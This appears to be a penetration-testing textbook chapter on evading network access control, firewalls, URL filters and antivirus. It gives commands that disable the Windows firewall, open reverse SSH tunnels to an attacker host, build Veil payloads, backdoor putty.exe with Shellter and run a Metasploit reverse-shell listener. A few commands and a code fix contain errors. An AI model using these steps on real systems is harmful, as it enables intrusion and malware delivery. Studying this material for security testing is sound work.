<html><head></head><body>
  <div id="_idContainer388" class="Basic-Text-Frame">
    <h1 class="chapterNumber">9</h1>
    <h1 id="_idParaDest-210" class="chapterTitle">Bypassing Security Controls</h1>
    <p class="normal">The COVID-19 pandemic has led many organizations to switch completely to remote working in 2020, and this has significantly increased the risk associated with the endpoint devices that remote workers use. The rise of <strong class="keyWord">Endpoint Detection and Response</strong> (<strong class="keyWord">EDR</strong>) from early 2018 to now has emerged as a replacement for traditional antivirus software, due to the various types of security incidents, especially sophisticated ransomware and leakware. Having said that, most of the time, when testers get internal network access or highly privileged access, they think they are done with the test, assuming that they have the knowledge and toolset to completely compromise the network or enterprise.</p>
    <p class="normal">One of the neglected aspects during a penetration test activity is bypassing security controls to assess the target organization’s detection and prevention techniques. In all penetration testing activities, penetration testers or attackers need to understand what renders the exploit ineffective while performing an active attack on the target network/system, and bypassing the security controls that are set by the target organization becomes crucial as part of the cyber kill chain methodology. In this chapter, we will review the different types of security controls in place, identify a systematic process for overcoming these controls, and demonstrate this using the tools from the Kali toolset.</p>
    <p class="normal">In this chapter, you will learn about the following:</p>
    <ul>
      <li class="bulletList">Bypassing<strong class="keyWord"> Network Access Control</strong> (<strong class="keyWord">NAC</strong>)</li>
      <li class="bulletList">Bypassing traditional <strong class="keyWord">Antivirus</strong> (<strong class="keyWord">AV</strong>)/<strong class="keyWord">Endpoint Detection and Response</strong> (<strong class="keyWord">EDR</strong>) <strong class="keyWord">tools</strong> using different tactics and techniques</li>
      <li class="bulletList">Bypassing application-level controls</li>
      <li class="bulletList">Understanding Windows-specific operating system security controls</li>
    </ul>
    <p class="normal">Let’s explore the different types of NAC and how to bypass them in the next section.</p>
    <h1 id="_idParaDest-211" class="heading-1">Bypassing Network Access Control (NAC)</h1>
    <p class="normal">NAC works on a basic form of the IEEE 802.1X standard. The majority of corporations implement <a id="_idIndexMarker991"/>NAC to protect network nodes, such as switches, routers, firewalls, servers, and, more importantly, endpoints. Decent NAC implies the controls that are put in place to prevent the intrusion by policies and also define who can access what. In this section, we will take a deep dive into different types of NAC that attackers or penetration testers encounter during an RTE or penetration test.</p>
    <p class="normal">There are no specific common criteria or standardization for NAC; it depends on the vendor and the way it is implemented. For example, Cisco provides Cisco Network Admission Control, and Microsoft provides Microsoft Network Access Protection. The primary purpose of NAC is to control the devices/elements, which can be connected, and then made sure that they are tested for compliance. NAC protections can be subdivided into two different categories:</p>
    <ul>
      <li class="bulletList">Pre-admission NAC</li>
      <li class="bulletList">Post-admission NAC</li>
    </ul>
    <p class="normal"><em class="italic">Figure 9.1</em> provides some mind map activities that can be performed by an attacker during an internal penetration test or post-exploitation phase as per the kill chain methodology:</p>
    <figure class="mediaobject"> <img src="../Images/B17765_09_01.png" alt="Diagram  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.1: A mind map of different NAC activities</p>
    <h2 id="_idParaDest-212" class="heading-2">Pre-admission NAC</h2>
    <p class="normal">In pre-admission <a id="_idIndexMarker992"/>NAC, basically, all <a id="_idIndexMarker993"/>the controls are put in place by security requirements in order to add a new device to the network. The following sections explain the different approaches for bypassing them:</p>
    <h3 id="_idParaDest-213" class="heading-3">Adding new elements</h3>
    <p class="normal">Typically, any <a id="_idIndexMarker994"/>mature NAC deployment in a corporation would be able to identify any new elements (devices) added to the network. During a red teaming exercise or internal penetration testing, an attacker typically adds a device to a network such as the <code class="inlineCode">pwnexpress</code> NAC and bypasses the restrictions set by the NAC by running Kali Linux on the device and maintaining shell access to the added device.</p>
    <p class="normal">In the <em class="italic">Bypassing MAC address authentication and open authentication</em> section of <em class="chapterRef">Chapter 6</em>, <em class="italic">Wireless and Bluetooth Attacks</em>, we saw how to bypass MAC address authentication and allow our system to admit the network through <code class="inlineCode">macchanger</code>.</p>
    <h3 id="_idParaDest-214" class="heading-3">Identifying the rules</h3>
    <p class="normal">Understanding how the rules are applied is considered an art, especially when an internal system <a id="_idIndexMarker995"/>is hiding behind an NAT. For example, if you are able to provide your Kali attack boxes a link to the internal network either by means of a MAC filter bypass or by physically plugging in a LAN cable, you have now added the element to the corporate network with a local IP address, as shown in <em class="italic">Figure 9.2</em>. DHCP information is automatically updated in your <code class="inlineCode">/etc/resolv.conf</code> file.</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_02.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.2: DHCP information on Kali Linux with internal DNS entries</p>
    <p class="normal">Many enterprises <a id="_idIndexMarker996"/>implement a DHCP proxy to protect themselves; this can be bypassed by adding a static IP address. Some routers will assign DHCP only after your device is authenticated through HTTP; this information can be captured by performing man-in-the-middle attacks.</p>
    <h4 class="heading-4">Exceptions</h4>
    <p class="normal">We have <a id="_idIndexMarker997"/>noted, through our experiences, that many organization that have obvious exceptions to the list of rules, which are applied to their access control listing. For example, if the application service port is allowed to be accessed by a restricted IP range, an authenticated element or endpoint can mimic exceptions such as routing.</p>
    <h4 class="heading-4">Quarantine rules</h4>
    <p class="normal">Identification <a id="_idIndexMarker998"/>of quarantine rules during a penetration test will test the ability of the attacker to circumvent the security controls set by an organization.</p>
    <h3 id="_idParaDest-215" class="heading-3">Disabling endpoint security</h3>
    <p class="normal">One of the <a id="_idIndexMarker999"/>things that attackers can encounter during the pre-admission NAC is that when an element is non-compliant, the endpoint will be disabled. For example, an element trying to connect to the network without antivirus installed will be automatically quarantined and the network port/interface on the switch will be disabled.</p>
    <h4 class="heading-4">Preventing remediation</h4>
    <p class="normal">The majority <a id="_idIndexMarker1000"/>of endpoints have antivirus and predefined remediation activities defined. For example, a specific device with a valid IP address performing a port scan will be blocked for a period of time and the traffic will be blocked by the antivirus software.</p>
    <h4 class="heading-4">Adding exceptions</h4>
    <p class="normal">It is also <a id="_idIndexMarker1001"/>important to add your own set of rules once you have access to the remote command shell. Testers can enable the remote desktop protocol by running <code class="inlineCode">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code> in the windows command line as an administrator.</p>
    <p class="normal">For example, you can utilize the <code class="inlineCode">netsh</code> Windows command-line utility to add a remote desktop through the firewall by entering the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
</code></pre>
    <p class="normal">Upon successful execution of the preceding command, attackers should be able to see the following figure:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_03.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.3: Adding a Windows remote desktop rule through a Windows firewall</p>
    <p class="normal">A non-stealthy <a id="_idIndexMarker1002"/>way would be to disable all the profiles by running <code class="inlineCode">netsh advfirewall set allprofiles state off</code>, or <code class="inlineCode">netsh firewall set opmode disable</code> in older versions of Windows.</p>
    <h2 id="_idParaDest-216" class="heading-2">Post-admission NAC</h2>
    <p class="normal">Post-admission <a id="_idIndexMarker1003"/>NAC is the set of devices <a id="_idIndexMarker1004"/>that are already authorized and sit between the user switch and distribution switches. A notable protection that attackers can try to bypass is the firewall and intrusion prevention systems.</p>
    <h3 id="_idParaDest-217" class="heading-3">Bypassing isolation</h3>
    <p class="normal">In the <a id="_idIndexMarker1005"/>case of advanced host intrusion prevention, if the endpoint is missing security configurations or is compromised or infected, there might be a rule to isolate the endpoint in a particular segment. This will provide an opportunity for attackers to exploit all the systems in that particular segment.</p>
    <h3 id="_idParaDest-218" class="heading-3">Detecting a honeypot</h3>
    <p class="normal">We have <a id="_idIndexMarker1006"/>even noticed that some companies have implemented advanced protection mechanisms, where signposting systems or servers that are infected are routed to a honeypot solution to set up a trap and uncover the actual motive behind the infection or attack.</p>
    <p class="normal">Testers can identify these honeypot hosts as they typically respond with all ports open.</p>
    <h1 id="_idParaDest-219" class="heading-1">Bypassing application-level controls</h1>
    <p class="normal">Bypassing <a id="_idIndexMarker1007"/>application controls is a straightforward activity after exploitation. Multiple application-level protections/controls are put in place. In this section, we will take a deep dive into common application-level controls and strategies to bypass them and establish a connection to the internet from the corporate network.</p>
    <h2 id="_idParaDest-220" class="heading-2">Tunneling past client-side firewalls using SSH</h2>
    <p class="normal">One of <a id="_idIndexMarker1008"/>the main things <a id="_idIndexMarker1009"/>to learn after adding yourself <a id="_idIndexMarker1010"/>to the internal network is how to tunnel past firewalls using SSH. We will now explore setting up a reverse tunnel to the attack box from the external internet by circumventing all the security controls put in place.</p>
    <h3 id="_idParaDest-221" class="heading-3">Inbound to outbound</h3>
    <p class="normal">In the following example, Kali Linux is running on the internet cloud at <code class="inlineCode">18.x.x.74</code> and running <a id="_idIndexMarker1011"/>the SSH service on port <code class="inlineCode">443</code> (make sure you change your SSH settings to change the port number by editing <code class="inlineCode">/etc/sshd_config</code> and <code class="inlineCode">Port</code> to <code class="inlineCode">443)</code>. From the internal corporate network, if all the ports are blocked at the firewall level, apart from ports <code class="inlineCode">80</code> and <code class="inlineCode">443</code>, this means insiders will be able to access the internet from the corporate network. Attackers would be able to utilize the remote Kali Linux by directly accessing the SSH service over port <code class="inlineCode">443</code>. Technically, as far as the company is concerned, this is from the internal network to the internet.</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_04.png" alt=""/></figure>
    <figure class="mediaobject">Figure 9.4: Accessing remote Kali Linux through port 443</figure>
    <p class="normal">Next, you should be able to use your Kali Linux machine on the cloud to communicate with the internal network.</p>
    <h3 id="_idParaDest-222" class="heading-3">Bypassing URL filtering mechanisms</h3>
    <p class="normal">You can utilize the existing SSH connection and port forwarding techniques to bypass any <a id="_idIndexMarker1012"/>restrictions set by the security policy or special device in place.</p>
    <p class="normal">In the following example, it showcases that there is a URL filtering device in place that prevents us from accessing certain websites, as shown in the following <em class="italic">Figure 9.5</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.5: Domain content blocked from the URL filtering device</p>
    <p class="normal">This can be bypassed using one of the tunneling tools; in this case, we will utilize portable <a id="_idIndexMarker1013"/>software called PuTTY, which can be downloaded directly from <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"><span class="url">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</span></a>:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Open the <code class="inlineCode">putty.exe</code> application (most of the time, there will be no block on the portable executables) and connect to your remote host on port <code class="inlineCode">443</code>, accept the certificate, and log in</li>
      <li class="numberedList">Click on <strong class="screenText">Tunnels</strong> from the <strong class="screenText">Connection</strong> tab</li>
      <li class="numberedList">Enter <a id="_idIndexMarker1014"/>the local port as <code class="inlineCode">8090</code> and add the remote port as <strong class="screenText">Auto</strong>, as shown in <em class="italic">Figure 9.6</em>:<figure class="mediaobject"><img src="../Images/B17765_09_06.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.6: Setting the tunneling through existing SSH communication</p>
        <p class="normal">This has now enabled internet access to your internal system using the SSH tunnel utilizing the external system’s setting, which means all the traffic on TCP port <code class="inlineCode">8090</code> can now be forwarded through the external system at <code class="inlineCode">18.x.x.74</code>.</p>
      </li>
      <li class="numberedList">The next step is to go to <strong class="screenText">Internet Options</strong> | <strong class="screenText">LAN connections</strong> | <strong class="screenText">Advanced</strong> | <strong class="screenText">SOCKs</strong> and enter <code class="inlineCode">127.0.0.1</code> in <strong class="screenText">Proxy address to use</strong> and <code class="inlineCode">8090</code> as the port, as shown in <em class="italic">Figure 9.7</em>:<figure class="mediaobject"><img src="../Images/B17765_09_07.png" alt="Graphical user interface, application  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 9.7: Setting the Socks IP to point to the proxy SSH tunnel</p>
      </li>
    </ol>
    <p class="normal">Now that <a id="_idIndexMarker1015"/>the proxy is pointed to the remote machine, you will be able to access the website without being blocked by the proxy or any URL filtering device, as shown in <em class="italic">Figure 9.8</em>. </p>
    <p class="normal">This way, penetration testers can bypass the URL filtering in place and also exfiltrate the data to the public cloud, the hacker’s hosted computer, or blocked websites.</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_08.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.8: Successfully accessing the restricted domain</p>
    <p class="normal">Upon <a id="_idIndexMarker1016"/>bypassing the URL filtering mechanisms, attackers might be able to access sites that they control; for example, they might be able to place crypto-malware to mine the compute power of the hosting endpoint.</p>
    <h3 id="_idParaDest-223" class="heading-3">Outbound to inbound</h3>
    <p class="normal">To establish a stable connection from external to internal systems, a tunnel must be established <a id="_idIndexMarker1017"/>using SSH. In this case, we have a Kali Linux machine connected to the internal LAN that has a valid IP address. The following command will facilitate the creation of a tunnel from inside the network to the outside world. Prior to running it, testers must ensure to change the SSH configuration by editing <code class="inlineCode">/etc/ssh/ssh_config</code> to set <code class="inlineCode">GatewayPorts</code> to <code class="inlineCode">yes</code> and restart the SSH service by running <code class="inlineCode">sudo service ssh restart</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">ssh -R 2210:localhost:443 -p 443 remotehacker@ExternalIPtoTunnel
</code></pre>
    <p class="normal"><em class="italic">Figure 9.9</em> shows the login from an internal network to Kali Linux on the cloud machine using SSH, which has opened up a port <code class="inlineCode">2210</code> on the local host to forward SSH:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_09.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.9: Creating a reverse SSH tunnel from the internal network to an external host</p>
    <p class="normal">This is <a id="_idIndexMarker1018"/>done to establish a stable reverse connection to the remote host, using a reverse SSH tunnel to bypass any firewall restrictions. It will be stealthier if the attackers leverage common ports such as <code class="inlineCode">80</code>, <code class="inlineCode">8080</code>, <code class="inlineCode">443</code>, and <code class="inlineCode">8443</code>. Once the remote system is authenticated, run the following command from the remote host. This should provide you with internal network access while sitting outside the firewall:</p>
    <pre class="programlisting con"><code class="hljs-con">ssh -p 2210 localhost
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_09_10.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.10: Successfully accessing the internal host through a reverse SSH tunnel from outside the firewall</p>
    <p class="normal">When you <a id="_idIndexMarker1019"/>have internal access, it is all about maintaining persistence to exfiltrate data and maintain access without triggering any firewall or network protection devices.</p>
    <h1 id="_idParaDest-224" class="heading-1">Bypassing the antivirus with files</h1>
    <p class="normal">The exploitation <a id="_idIndexMarker1020"/>phase of the cyber kill chain is the most dangerous one for the penetration tester or attacker as they are directly interacting with the target network or system, and there is a high risk of their activity being logged or their identity being discovered. Again, stealth must be employed to minimize the risk to the tester. Although no specific methodology or tool is undetectable, there are some configuration changes and specific tools that will make detection more difficult.</p>
    <p class="normal">When considering remote exploits, most networks and systems employ various types of defensive controls to minimize the risk of attack. Network devices include routers, firewalls, intrusion detection and prevention systems, and malware detection software.</p>
    <p class="normal">To facilitate <a id="_idIndexMarker1021"/>exploitation, most frameworks incorporate features to make the attack somewhat stealthy. The Metasploit framework allows you to manually set evasion factors on an exploit-by-exploit basis, determining which factors (such as encryption, port number, filenames, and others) may be difficult to identify and will change for each particular ID. The Metasploit framework also allows communication between the target and the attacking systems to be encrypted (the <code class="inlineCode">windows/meterpreter/reverse_tcp_rc4</code> payload), making it difficult for the exploit payload to be detected.</p>
    <p class="normal">Metasploit Pro (Nexpose), available as a community edition on the Kali distribution, includes the following to specifically bypass intrusion detection systems:</p>
    <ul>
      <li class="bulletList">The scan speed can be adjusted in the <strong class="screenText">Discovery</strong> <strong class="screenText">Scan</strong> settings, reducing the speed of interaction with the target by setting the speed to sneaky or paranoid</li>
      <li class="bulletList">This implements transport evasion by sending smaller TCP packets and increasing the transmission time between the packets</li>
      <li class="bulletList">This reduces the number of simultaneous exploits launched against a target system</li>
      <li class="bulletList">There are application-specific evasion options for exploits that involve DCERPC, HTTP, and SMB, which can be set automatically</li>
    </ul>
    <p class="normal">Most antivirus software relies on signature matching to locate viruses, ransomware, or any other malware. They examine each executable for strings of code known to be present in viruses (the signature) and create an alarm when a suspect string is detected. Many of Metasploit’s attacks rely on files that may possess a signature that, over time, has been identified by antivirus vendors.</p>
    <p class="normal">In response to this, the Metasploit framework allows standalone executables to be encoded to bypass detection. </p>
    <p class="normal">Unfortunately, extensive testing of these executables at public sites, such as <a href="http://virustotal.com"><span class="url">virustotal.com</span></a> and <a href="http://antiscan.me"><span class="url">antiscan.me</span></a>, has decreased their effectiveness in bypassing the AV software. However, this has given rise to frameworks such as Veil and Shellter, which can bypass the AV software by cross verifying the executable <a id="_idIndexMarker1022"/>by uploading them directly to VirusTotal before planting the backdoor in the target environment.</p>
    <h2 id="_idParaDest-225" class="heading-2">Using the Veil framework</h2>
    <p class="normal">The Veil framework <a id="_idIndexMarker1023"/>is another AV-evasion framework, written <a id="_idIndexMarker1024"/>by Chris Truncer, and called Veil-Evasion, which provides <a id="_idIndexMarker1025"/>effective protection against, and detection of, any standalone exploits for endpoints and servers. Although this framework is stalled (not supported) by the creator, this tool still can still be used by attackers to render payloads undetectable by further modifying the tool-created payloads. The latest version of the Veil framework, as <a id="_idIndexMarker1026"/>of August 2021, is 3.1.14. The framework consists of <a id="_idIndexMarker1027"/>two tools: <strong class="keyWord">Evasion</strong> and <strong class="keyWord">Ordnance</strong>. The Veil framework is available from Kali repositories and is automatically installed by simply entering <code class="inlineCode">sudo apt install veil</code> in the terminal.</p>
    <div class="packt_tip">
      <p class="normal">If you receive any errors during installation, rerun <code class="inlineCode">/usr/share/veil/config/setup.sh --force --silent</code>.</p>
    </div>
    <p class="normal">Evasion aggregates various techniques into a framework that simplifies management, while Ordnance generates the shellcode for supported payloads to further create new exploits for known vulnerabilities.</p>
    <p class="normal">As a framework, Veil takes <a id="_idIndexMarker1028"/>several features, which include the following:</p>
    <ul>
      <li class="bulletList">It incorporates custom shellcode in a variety of programming languages, including C, C#, and Python</li>
      <li class="bulletList">It can use Metasploit-generated shellcode, or you can create your own using Ordnance</li>
      <li class="bulletList">It can integrate third-party tools such as Hyperion (which encrypts an EXE file with AES 128-bit encryption), PEScrambler, and BackDoor Factory</li>
      <li class="bulletList">Payloads can be generated and seamlessly substituted into all PsExec, Python, and <code class="inlineCode">.exe</code> calls</li>
      <li class="bulletList">Users can reuse shellcode or implement their own encryption methods</li>
      <li class="bulletList">Its functionality can be scripted to automate deployment</li>
    </ul>
    <p class="normal">Veil can generate an exploit payload; the standalone payloads include the following options:</p>
    <ul>
      <li class="bulletList">Minimal Python <a id="_idIndexMarker1029"/>installation to invoke shellcode; it uploads a minimal <code class="inlineCode">Python.zip</code> installation and the 7Zip binary. The Python environment is unzipped, invoking the shellcode. Since the only files that interact with the victim are trusted Python libraries and the interpreter, the victim’s AV does not detect any unusual activity.</li>
      <li class="bulletList">The Sethc backdoor configures the victim’s registry to launch the RDP sticky keys backdoor.</li>
      <li class="bulletList">A PowerShell shellcode injector.</li>
    </ul>
    <p class="normal">When the <a id="_idIndexMarker1030"/>payloads have been created, they can be delivered to the target in one of the following two ways:</p>
    <ul>
      <li class="bulletList">Upload and execute using Impacket and the PTH toolkit</li>
      <li class="bulletList">UNC invocation</li>
    </ul>
    <p class="normal">Veil presents the user with the main menu, which provides two tools to select from, and a number of payload modules that are loaded, as well as the available commands. Typing <code class="inlineCode">use Evasion</code> will take us to the Evasion tool, while the <code class="inlineCode">list</code> command will list all the available <code class="inlineCode">payloads</code>. The Veil framework’s initial launch screen is shown in <em class="italic">Figure 9.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_11.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.11: Main menu of the Veil framework</p>
    <p class="normal">Presently, there <a id="_idIndexMarker1031"/>are 41 payloads designed to bypass antivirus software by employing encryption or direct injection into the memory space, in the Evasion tool. These payloads are shown in <em class="italic">Figure 9.12</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.12: Veil-Evasion options</p>
    <p class="normal">To obtain information on a specific payload, type <code class="inlineCode">info &lt;payload number / payload name&gt;</code> or <code class="inlineCode">info &lt;tab&gt;</code> to autocomplete the payloads that are available. You can also just enter the number from the list. In the following example, we entered <code class="inlineCode">14</code> to select the <code class="inlineCode">python/shellcode_inject/aes_encrypt</code> payload by running <code class="inlineCode">use 29</code>.</p>
    <p class="normal">The exploit <a id="_idIndexMarker1032"/>includes an <code class="inlineCode">expire_payload</code> option. If the module is not executed by the target user within a specified timeframe, it is rendered inoperable and also includes <code class="inlineCode">CLICKTRACK</code>, which sets the value of how many clicks the user has to make to execute the payload. This function contributes to the stealthiness of the attack.</p>
    <p class="normal">Some of the required options are pre-filled with default values and descriptions. If a required value isn’t completed by default, the tester will need to do the following:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Input a value before the payload can be generated. To set the value for an option, enter <code class="inlineCode">set &lt;option name&gt;</code>.</li>
      <li class="numberedList">Then type the desired value. To accept the default options and create the exploit, type <code class="inlineCode">generate</code> in the Veil-Evasion shell.</li>
    </ol>
    <div class="note">
      <p class="normal">There is a known bug that will throw error messages relating to encryption. Testers can edit the file located at <code class="inlineCode">/usr/share/veil/tools/evasion/evasion_common/encryption.py</code> and edit line 21 from <code class="inlineCode">aes_cipher_object = AES.new(random_aes_key, AES.MODE_CBC, iv)</code> to<code class="inlineCode"> es_cipher_object = AES.new(random_aes_key.encode('utf-8'), AES.MODE_CBC, iv.encode('utf-8'))</code> without the quotes. That should fix the error message without any problem.</p>
    </div>
    <p class="normal">Ordnance is, by default, where you will be able to generate specific shellcode. If there is an error, it will default to <code class="inlineCode">msfvenom</code> or custom shellcode. If the custom shellcode option is selected, enter the shellcode in the form of <code class="inlineCode">\x01\x02</code>, without quotes and newlines (<code class="inlineCode">\n</code>). If the default <a id="_idIndexMarker1033"/>option <code class="inlineCode">msfvenom</code> is selected, you will be prompted with the default payload choice of <code class="inlineCode">windows/meterpreter/reverse_tcp</code>. If you wish to use another payload, press the <em class="keystroke">Tab</em> key to complete the available payloads. The available payloads are shown in <em class="italic">Figure 9.13</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.13: Metasploit payload options in Veil-Evasion</p>
    <p class="normal">In <em class="italic">Figure 9.14</em>, pressing the <em class="keystroke">Tab</em> key <a id="_idIndexMarker1034"/>was used to demonstrate some of the available payloads; however, the default (<code class="inlineCode">windows/meterpreter/reverse_tcp</code>) was selected:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_14.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.14: Successfully creating a file with a payload</p>
    <p class="normal">Veil-Evasion exploits can also be created directly from the terminal by using the following options. In this example, we use option 14 to create a payload executable using Go:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo veil –t Evasion -p 14 --ordnance-payload rev_https --ip 192.168.1.7 --port 443 -o Outfile
</code></pre>
    <p class="normal">The preceding command should output the file with the exploit executable, source code, and resource file to the Metasploit payload, as shown in <em class="italic">Figure 9.15</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_15.png" alt="A screenshot of a computer  Description automatically generated with medium confidence"/></figure>
    <p class="packt_figref">Figure 9.15: Successfully creating an exploit executable with the Go language</p>
    <p class="normal">Once an <a id="_idIndexMarker1035"/>exploit has been created, the tester should verify the payload against VirusTotal to ensure that it will not trigger an alert when it is placed on the target system. If the payload sample is submitted directly to VirusTotal and its behavior flags it as malicious software, then a signature update against the submission can be released by antivirus vendors in as little as 1 hour. This is why users are admonished with the <code class="inlineCode">don't submit samples to any online scanner!</code> message.</p>
    <p class="normal">Veil-Evasion allows testers to use a safe check against VirusTotal. When any payload is created, an SHA1 hash is created and added to <code class="inlineCode">hashes.txt</code>, located in the <code class="inlineCode">~/veil-output</code> directory. Testers can invoke the <code class="inlineCode">checkvt</code> script to submit the hashes to VirusTotal, which will check the SHA1 hash values against its malware database. If a Veil-Evasion payload triggers a match, then the tester knows that it may be detected by the target system. If it does not trigger a match, then the exploit payload will bypass the antivirus software. A successful lookup (not detectable by AV) using the <code class="inlineCode">checkvt</code> command is shown as follows:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_16.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.16: Successfully creating an exploit executable with the Go language</p>
    <p class="normal">If the attackers <a id="_idIndexMarker1036"/>receive any error message while running the <code class="inlineCode">checkvt</code> command, ensure that you edit the file located at <code class="inlineCode">/usr/share/veil/tools/evasion/scripts/vt-notify/vt-notify.rb</code> and change <code class="inlineCode">$apikey</code> to your key.</p>
    <h2 id="_idParaDest-226" class="heading-2">Using Shellter</h2>
    <p class="normal">Shellter is another <a id="_idIndexMarker1037"/>antivirus evasion tool that infects the PE dynamically <a id="_idIndexMarker1038"/>and is also used to inject shellcode into any <strong class="keyWord">32-bit </strong>native Windows application. It allows attackers to either customize the payload or utilize the Metasploit framework. The majority of antiviruses will not be able to identify the malicious executable, depending upon how the attackers re-encode the endless number of signatures.</p>
    <p class="normal">Shellter can be installed by running <code class="inlineCode">sudo apt-get install shellter</code> in the terminal. Once the application is installed, we should be able to open Shellter by issuing the <code class="inlineCode">sudo shellter</code> command in the terminal and then see <em class="italic">Figure 9.17</em>, where we are ready to create a backdoor on any executable:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_17.png" alt=""/></figure>
    <p class="packt_figref">Figure 9.17: Shellter main menu from Kali Linux</p>
    <p class="normal">Once Shellter <a id="_idIndexMarker1039"/>is launched, the following are the typical steps involved in creating a malicious executable:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Attackers should be given the option to select either <code class="inlineCode">Auto</code> (<code class="inlineCode">A</code>) or <code class="inlineCode">Manual</code> (<code class="inlineCode">M</code>), and <code class="inlineCode">Help</code> (<code class="inlineCode">H</code>). For demonstration purposes, we will utilize <code class="inlineCode">Auto</code> mode.</li>
      <li class="numberedList">The next step is to provide the PE target file; attackers can choose any <code class="inlineCode">.exe</code> file or utilize the executables in <code class="inlineCode">/usr/share/windows-binaries/</code>. In this case, we have utilized 32-bit <code class="inlineCode">putty.exe</code>.</li>
      <li class="numberedList">Once the PE target file location is provided, Shellter will be able to disassemble the PE file, as shown in <em class="italic">Figure 9.18</em>:<figure class="mediaobject"><img src="../Images/B17765_09_18.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.18: Shellter compiling a 32-bit application with the custom DLL injection</p>
      </li>
      <li class="numberedList">When <a id="_idIndexMarker1040"/>disassembly is complete, Shellter will provide the option to enable stealth mode.</li>
      <li class="numberedList">Following stealth mode selection, you will be able to inject the listed payloads into the same PE file, as shown in <em class="italic">Figure 9.19</em>, or you can press the <em class="keystroke">C</em> key for a custom payload:<figure class="mediaobject"><img src="../Images/B17765_09_19.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.19: Selecting the payload options in Shellter</p>
      </li>
      <li class="numberedList">In this <a id="_idIndexMarker1041"/>example, we utilize <code class="inlineCode">Meterpreter_reverse_HTTPS</code> and provide <code class="inlineCode">LHOST</code> and <code class="inlineCode">LPORT</code>, as shown in <em class="italic">Figure 9.20</em>:<figure class="mediaobject"><img src="../Images/B17765_09_20.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.20: Successfully setting the payload options</p>
      </li>
      <li class="numberedList">All the <a id="_idIndexMarker1042"/>required information is fed to Shellter. At the same time, the PE file provided as input is now injected with the payload and the injection is complete.<figure class="mediaobject"><img src="../Images/B17765_09_21.png" alt=""/></figure>
        <p class="packt_figref">Figure 9.21: Shellter main menu from Kali Linux</p>
      </li>
    </ol>
    <p class="normal">Once this <a id="_idIndexMarker1043"/>executable is delivered to the victim, attackers will now be able to open up the listener as per the payload; in our example, <code class="inlineCode">LHOST</code> is <code class="inlineCode">10.10.10.12</code> and <code class="inlineCode">LPORT</code> is <code class="inlineCode">443</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">use exploit/multi/handler 
set payload windows/meterpreterreverse_HTTPS 
set lhost &lt;YOUR KALI IP&gt; 
set lport 443 
set exitonsession false 
exploit -j -z
</code></pre>
    <p class="normal">Now, you can save the preceding list of commands to a filename as <code class="inlineCode">listener.rc</code>, and run it using Metasploit by running <code class="inlineCode">msfconsole -r listener.rc</code>. Once the victim system opens without being blocked by the antivirus or any security controls, it should open the shell to the attacker’s IP without any trouble, as shown in <em class="italic">Figure 9.22</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_09_22.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 9.22: Shellter main menu from Kali Linux</p>
    <p class="normal">That concludes <a id="_idIndexMarker1044"/>the most effective way of building a backdoor and planting it on a victim system.</p>
    <div class="note">
      <p class="normal">The majority of antiviruses will be able to catch the reverse Meterpreter shell; however, it is recommended that penetration testers encode multiple times before dropping the exploit.</p>
    </div>
    <h1 id="_idParaDest-227" class="heading-1">Going fileless and evading antivirus</h1>
    <p class="normal">Most organizations allow users to access their internal infrastructure on all the network segments or <a id="_idIndexMarker1045"/>have a flat network. In some organizations, particularly in the banking sector, the networks are segregated, and strict access controls are put in place. As an example, an internal firewall rule may be created to permit only port <code class="inlineCode">80</code> or <code class="inlineCode">443</code> as outbound communication and block all the other ports. So, it is recommended to utilize ports <code class="inlineCode">80</code> or <code class="inlineCode">443</code> for all listeners during testing. In this section, we will explore some quick wins to bypass security controls and take over a given system.</p>
    <h1 id="_idParaDest-228" class="heading-1">Bypassing Windows operating system controls</h1>
    <p class="normal">In every corporate environment, we see that all the endpoints provided to end users are typically <a id="_idIndexMarker1046"/>Windows operating systems. The likelihood of exploiting Windows is always high due to its level of usage. In this section, we will focus on some of the specific Windows operating system security controls and how to bypass them post access to the endpoint. In the following example, we have utilized a Windows 10 virtual machine for demonstration purposes.</p>
